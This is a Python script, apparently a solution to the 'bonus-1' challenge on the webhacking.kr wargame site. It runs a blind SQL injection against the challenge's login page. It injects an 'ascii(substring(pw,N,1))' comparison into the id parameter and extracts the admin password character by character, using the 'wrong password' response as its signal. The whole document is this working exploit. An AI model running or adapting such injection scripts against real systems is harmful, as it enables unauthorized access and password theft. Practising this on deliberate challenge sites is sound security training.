from urllib.request import Request,urlopen
from urllib.parse import urlencode
import time
import re
 
ascii_range = list(range(97,127)) + list(range(65,97)) + list(range(33,65))
 
now = time.strftime("[%H:%M:%S]")
print(now, "blind sql injection start..!")
 
pw = ""
for i in range(36) : # pw 길이 
    print("try... ", end="")
    for char in ascii_range :
        url = "https://webhacking.kr/challenge/bonus-1/index.php"
        query = "admin' and ascii(substring(pw,"+ str(i+1) +",1))="+ str(char) +"#"
        params = {"id" : query, "pw" : "shionista"}
        
        data = urlencode(params)
        url = url + "?" + data
        
        req = Request(url)
        resp = urlopen(req).read()
        resp = resp.decode()
        
        print(chr(char), end="")
        
        check = re.findall("wrong password", resp)
        if len(check) != 0 :
            pw += chr(char)
            break
       
    now = time.strftime("[%H:%M:%S]")
    print("")
    print("====================================================================")
    print(now, "result - %d" % (i+1))
    print("pw =", pw)
    print("====================================================================")